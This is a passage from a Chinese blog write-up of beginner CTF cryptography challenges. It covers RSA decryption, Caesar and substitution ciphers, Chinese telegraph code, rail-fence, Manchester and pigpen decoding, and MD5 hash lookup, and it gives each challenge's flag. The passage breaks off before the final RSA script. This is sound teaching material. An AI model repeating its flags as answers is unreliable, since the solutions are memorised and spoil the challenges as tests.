number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>d <span class="token operator">=</span> <span class="token number">56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">#求明文</span></pre></td></tr><tr><td data-num="11"></td><td><pre>M <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>C<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token comment">#快速求幂取模运算</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span></pre></td></tr></table></figure><p>脚本运行得到</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">5577446633554466577768879988</span></pre></td></tr></table></figure><h2 id="大帝的密码武器"><a class="anchor" href="#大帝的密码武器">#</a> 大帝的密码武器</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/b7faf383f0b39cf87beb3fbdb260346.png" alt="b7faf383f0b39cf87beb3fbdb260346" /></p>
<p>使用脚本进行凯撒解密</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>str1 <span class="token operator">=</span> <span class="token string">'FRPHEVGL'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>str2 <span class="token operator">=</span> str1<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>                                 <span class="token comment">#转换为小写方便识别</span></pre></td></tr><tr><td data-num="3"></td><td><pre>num <span class="token operator">=</span> <span class="token number">1</span>                                             <span class="token comment">#偏移量</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:&lt;2d&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">for</span> temp <span class="token keyword">in</span> str2<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">+</span>num <span class="token operator">></span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>               <span class="token comment">#如果超出 'z', 需要重新映射会 a~z 这 26 个字母上</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">+</span>num<span class="token operator">-</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">+</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    num <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/fb1a71c0807f752b315f68e706a623a.png" alt="fb1a71c0807f752b315f68e706a623a" /></p>
<p>可以看到偏移量是 13 的时候，好像是我们想要的东西，然后将密文里面的 <code>ComeChina</code>  做偏移量为 13 的偏移</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'ComeChina'</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">for</span> temp <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">13</span> <span class="token operator">></span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>               </pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">13</span><span class="token operator">-</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>最终得到 <code>PbzrPuvan</code>  即为 flag</p>
<h2 id="windows系统密码"><a class="anchor" href="#windows系统密码">#</a> Windows 系统密码</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>将原 hash 文件改成 txt 文件格式然后打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/578ca7cf35d61a62b6eb41c7f4532cc.png" alt="578ca7cf35d61a62b6eb41c7f4532cc" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/74149cf4321cbad54c492359dcbd091.png" alt="74149cf4321cbad54c492359dcbd091" /></p>
<p>显而易见是 32 位的 md5 加密，将其一一进行解密，最后得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/5ec755dae11bc1da378dcb6379cd59c.png" alt="5ec755dae11bc1da378dcb6379cd59c" /></p>
<h2 id="信息化时代的步伐"><a class="anchor" href="#信息化时代的步伐">#</a> 信息化时代的步伐</h2>
<p>也许中国可以早早进入信息化时代，但是被清政府拒绝了。附件中是数十年后一位伟人说的话的密文。请翻译出明文 (答案为一串中文！) 注意：得到的 flag 请包上 flag {} 提交</p>
<p>下载并打开附件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/a1aaf9f531f642936b00aaa4a9cf39b.png" alt="a1aaf9f531f642936b00aaa4a9cf39b" /></p>
<p>得到密文</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">606046152623600817831216121621196386</span></pre></td></tr></table></figure><p>根据提示可知为中文电码</p>
<p>解密网站：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/0553fe46295be2bbc7ca26b9ec26fc6.png" alt="0553fe46295be2bbc7ca26b9ec26fc6" /></p>
<p>可知 flag 为</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>计算机要从娃娃抓起<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="传统知识古典密码"><a class="anchor" href="#传统知识古典密码">#</a> 传统知识 + 古典密码</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401200139539.png" alt="image-20220401200139539" /></p>
<p>根据提示找出六十甲子顺序表，一一对应</p>
<table>
<thead>
<tr>
<th>01 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQjIlRTUlQUQlOTAvMzU4Njk=">甲子</span></th>
<th>11<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQjIlRTYlODglOEM="> 甲戌</span></th>
<th>21<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQjIlRTclOTQlQjM="> 甲申</span></th>
<th>31 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQjIlRTUlOEQlODgvNDEzNTE2Ng==">甲午</span></th>
<th>41<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQjIlRTglQkUlQjA="> 甲辰</span></th>
<th>51<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQjIlRTUlQUYlODUvNDE2NDE4MA=="> 甲寅</span></th>
</tr>
</thead>
<tbody>
<tr>
<td>02 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjklOTklRTQlQjglOTE=">乙丑</span></td>
<td>12 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjklOTklRTQlQkElQTU=">乙亥</span></td>
<td>22<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjklOTklRTklODUlODk="> 乙酉</span></td>
<td>32 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjklOTklRTYlOUMlQUE=">乙未</span></td>
<td>42<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjklOTklRTUlQjclQjM="> 乙巳</span></td>
<td>52 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjklOTklRTUlOEQlQUY=">乙卯</span></td>
</tr>
<tr>
<td>03 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglOTklRTUlQUYlODU=">丙寅</span></td>
<td>13<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglOTklRTUlQUQlOTA="> 丙子</span></td>
<td>23 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglOTklRTYlODglOEM=">丙戌</span></td>
<td>33<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglOTklRTclOTQlQjM="> 丙申</span></td>
<td>43<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglOTklRTUlOEQlODg="> 丙午</span></td>
<td>53<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglOTklRTglQkUlQjA="> 丙辰</span></td>
</tr>
<tr>
<td>04<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglODElRTUlOEQlQUY="> 丁卯</span></td>
<td>14<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglODElRTQlQjglOTE="> 丁丑</span></td>
<td>24<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglODElRTQlQkElQTU="> 丁亥</span></td>
<td>34<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglODElRTklODUlODk="> 丁酉</span></td>
<td>44<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglODElRTYlOUMlQUE="> 丁未</span></td>
<td>54<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglODElRTUlQjclQjM="> 丁巳</span></td>
</tr>
<tr>
<td>05<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlODglOEElRTglQkUlQjA="> 戊辰</span></td>
<td>15<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlODglOEElRTUlQUYlODU="> 戊寅</span></td>
<td>25<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlODglOEElRTUlQUQlOTA="> 戊子</span></td>
<td>35<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlODglOEElRTYlODglOEM="> 戊戌</span></td>
<td>45<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlODglOEElRTclOTQlQjM="> 戊申</span></td>
<td>55 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlODglOEElRTUlOEQlODg=">戊午</span></td>
</tr>
<tr>
<td>06<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQjclQjElRTUlQjclQjM="> 己巳</span></td>
<td>16<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQjclQjElRTUlOEQlQUY="> 己卯</span></td>
<td>26<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQjclQjElRTQlQjglOTE="> 己丑</span></td>
<td>36 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQjclQjElRTQlQkElQTU=">己亥</span></td>
<td>46 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQjclQjElRTklODUlODk=">己酉</span></td>
<td>56 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQjclQjElRTYlOUMlQUE=">己未</span></td>
</tr>
<tr>
<td>07<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQkElOUElRTUlOEQlODg="> 庚午</span></td>
<td>17 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQkElOUElRTglQkUlQjA=">庚辰</span></td>
<td>27<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQkElOUElRTUlQUYlODU="> 庚寅</span></td>
<td>37 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQkElOUElRTUlQUQlOTAvNTk5NTA4">庚子</span></td>
<td>47 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQkElOUElRTYlODglOEM=">庚戌</span></td>
<td>57 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQkElOUElRTclOTQlQjM=">庚申</span></td>
</tr>
<tr>
<td>08<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQkUlOUIlRTYlOUMlQUE="> 辛未</span></td>
<td>18 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQkUlOUIlRTUlQjclQjM=">辛巳</span></td>
<td>28 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQkUlOUIlRTUlOEQlQUY=">辛卯</span></td>
<td>38 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQkUlOUIlRTQlQjglOTE=">辛丑</span></td>
<td>48 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQkUlOUIlRTQlQkElQTUvMjYyMzA=">辛亥</span></td>
<td>58 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQkUlOUIlRTklODUlODkvNDE2NDgxOQ==">辛酉</span></td>
</tr>
<tr>
<td>09<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQTMlQUMlRTclOTQlQjM="> 壬申</span></td>
<td>19<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQTMlQUMlRTUlOEQlODg="> 壬午</span></td>
<td>29 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQTMlQUMlRTglQkUlQjA=">壬辰</span></td>
<td>39 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQTMlQUMlRTUlQUYlODU=">壬寅</span></td>
<td>49 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQTMlQUMlRTUlQUQlOTA=">壬子</span></td>
<td>59 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQTMlQUMlRTYlODglOEM=">壬戌</span></td>
</tr>
<tr>
<td>10<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTklQjglRTklODUlODk="> 癸酉</span></td>
<td>20<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTklQjglRTYlOUMlQUE="> 癸未</span></td>
<td>30 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTklQjglRTUlQjclQjM=">癸巳</span></td>
<td>40 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTklQjglRTUlOEQlQUY=">癸卯</span></td>
<td>50 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTklQjglRTQlQjglOTE=">癸丑</span></td>
<td>60 <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTklQjglRTQlQkElQTU=">癸亥</span></td>
</tr>
</tbody>
</table>
<p>辛卯为 28，癸巳为 30，丙戌 23，辛未为 8，庚辰为 17，癸酉为 10，己卯为 16，癸巳为 30，各加甲子（甲子为 60），故为 88，90，83，68，77，70，76，90</p>
<p>使用<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvYXNjaWkuaHRt"> ascii 解密</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401200625116.png" alt="image-20220401200625116" /></p>
<p>最终用十进制解码解出得到： <code>XZSDMFLZ</code></p>
<p>对其进行栅栏解密之后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/d64c6fb75c27f4c610746a5ad2f89a7.png" alt="d64c6fb75c27f4c610746a5ad2f89a7" /></p>
<p>再对各项进行凯撒解密</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/8012d62467347c334e8ecc404083217.png" alt="8012d62467347c334e8ecc404083217" /></p>
<p>得到 <code>SHUANGYU</code></p>
<p>传感器附件打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/5d8ce057fbb639655c79d3545f41913.png" alt="5d8ce057fbb639655c79d3545f41913" /></p>
<p>根据曼联搜索发现是曼彻斯特编码，编写脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>cipher<span class="token operator">=</span><span class="token string">'5555555595555A65556AA696AA6666666955'</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">def</span> <span class="token function">iee</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    tmp<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        a<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token operator">+</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        tmp<span class="token operator">=</span>tmp<span class="token operator">+</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    plain<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>iee<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/5d059ae9080585c80ef442b518f92fd.png" alt="5d059ae9080585c80ef442b518f92fd" /></p>
<p>解码得到： <code>FFFFFED31F645055F9</code></p>
<p>将前后两个解码结果合并之后以为会是这道题的 flag</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>SHUANGYUFFFFFED31F645055F9<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>然而试验之后发现 flag 仅为 <code>flag&#123;SHUANGYU&#125;</code></p>
<p>所以后面的曼彻斯特编码到底有啥作用也不得而知。</p>
<h2 id="凯撒替换呵呵"><a class="anchor" href="#凯撒替换呵呵">#</a> 凯撒？替换？呵呵！</h2>
<p CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO="">MTHJ</p>
<p 小写字母="">注意：得到的 flag 请包上 flag {} 提交，flag</p>
<p>普通的凯撒很明显解不出来，凯撒密码一般就是按字母顺序来位移实现的加密方法，进阶版的凯撒就不按照字母顺序的加密，要经过暴力爆破出每一种可能的加密方式。用工具<span class="exturl" data-url="aHR0cHM6Ly9xdWlwcWl1cC5jb20v"> quipqiup</span><br />
MTHJ 应该就是 flag，然后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/59b92aa861e5775da0467807fac8cbb.png" alt="59b92aa861e5775da0467807fac8cbb" /> 这样就可以得到爆破出来的明文</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/da43c3800efdf30ccaba7ec330b2f87.png" alt="" /></p>
<p>读了之后发现第一个就是 flag。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="萌萌哒的八戒"><a class="anchor" href="#萌萌哒的八戒">#</a> 萌萌哒的八戒</h2>
<p>萌萌哒的八戒原来曾经是猪村的村长，从远古时期，猪村就有一种神秘的代码。请从附件中找出代码，看看萌萌哒的猪八戒到底想说啥 注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开解压图片，可以看到一串密文</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/bajie.jpg" alt="bajie" /></p>
<p>一看猪猪的猪圈密码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/98f717070ecec1044a9a5f277db3ac0.png" alt="98f717070ecec1044a9a5f277db3ac0" /></p>
<p>得到 flag</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>whenthepigwanttoeat<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="rsa1"><a class="anchor" href="#rsa1">#</a> RSA1</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目得到</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401201327834.png" alt="image-20220401201327834" /></p>
<p>RSA 中熟悉的 p,q,dp,dq,c，经典的 dp 泄露了</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>p <span class="token operator">=</span> <span class="token number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>q <span class="token operator">=</span> <span class="token number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </pre></td></tr><tr><td data-num="3"></td><td><pre>dp <span class="token operator">=</span> <span class="token number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>dq <span class="token operator">=</span> <span class="token number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>c <span class="token operator">=</span> <span class="token number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></pre></td></tr></table></figure><p>使用脚本</p>
